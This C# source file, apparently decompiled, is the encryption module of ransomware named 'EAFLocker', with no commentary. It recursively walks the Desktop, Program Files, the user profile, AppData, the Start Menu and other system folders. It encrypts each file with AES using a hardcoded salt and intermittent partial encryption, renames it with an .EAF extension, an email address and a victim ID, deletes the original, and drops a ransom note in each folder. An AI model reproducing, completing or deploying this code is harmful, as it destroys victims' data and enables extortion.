using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Fast;

internal class ENC2
{
	public class EAFLocker
	{
		public void EnceyptFile(string file)
		{
			try
			{
				string extension = Path.GetExtension(file);
				if (!(extension != ".EAF"))
				{
					return;
				}
				string encryptPassword = EncryptPassword;
				string fileName = Path.GetFileName(file);
				string directoryName = Path.GetDirectoryName(file);
				string text = directoryName + "\\[" + Program.email1 + "][" + Program.UniqueID() + "]" + fileName + ".EAF";
				if (!Encrypt(file, text, encryptPassword) && extension != ".EAF")
				{
					try
					{
						File.Move(file, text);
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch
			{
			}
		}

		private bool Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
		{
			try
			{
				using (FileStream fileStream = new FileStream(inputFilePath, FileMode.Open))
				{
					using (FileStream fileStream2 = new FileStream(outputfilePath, FileMode.Create))
					{
						fileStream.Position = 0L;
						using (Aes aes = Aes.Create())
						{
							byte[] salt = new byte[13]
							{
								73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
								100, 101, 118
							};
							using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, salt);
							aes.Mode = CipherMode.CBC;
							aes.Padding = PaddingMode.PKCS7;
							aes.Key = rfc2898DeriveBytes.GetBytes(32);
							aes.IV = rfc2898DeriveBytes.GetBytes(16);
							using CryptoStream cryptoStream = new CryptoStream(fileStream2, aes.CreateEncryptor(), CryptoStreamMode.Write);
							int count = 4096;
							byte[] buffer = new byte[4096];
							int num = 0;
							int num2;
							do
							{
								num2 = fileStream.Read(buffer, 0, count);
								if (num > 400000)
								{
									if (num >= 800000 && num <= 1200000)
									{
										cryptoStream.Write(buffer, 0, num2);
									}
									else if (num >= 1600000 && num <= 2000000)
									{
										cryptoStream.Write(buffer, 0, num2);
									}
									else
									{
										fileStream2.Write(buffer, 0, num2);
									}
								}
								else
								{
									cryptoStream.Write(buffer, 0, num2);
								}
								num += num2;
							}
							while (num2 != 0);
							cryptoStream.Close();
						}
						fileStream2.Close();
					}
					fileStream.Close();
				}
				File.Delete(inputFilePath);
				return true;
			}
			catch (SystemException)
			{
				return false;
			}
		}
	}

	public static EAFLocker EL;

	private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;

	public static void Start()
	{
		EL = new EAFLocker();
		new Thread((ThreadStart)delegate
		{
			LookForDirectories();
		}).Start();
	}

	private static void LookForDirectories()
	{
		try
		{
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.NetworkShortcuts));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.PrinterShortcuts));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonAdminTools));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonOemLinks));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonTemplates));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		}
		catch
		{
		}
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(Program.validExtensions, (string E) => E != extension.ToLower()) && extension != ".EAF" && fileName != Program.droppedMessageTextbox && fileName != Program.processURL)
					{
						EL.EnceyptFile(files[i]);
						File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}
}
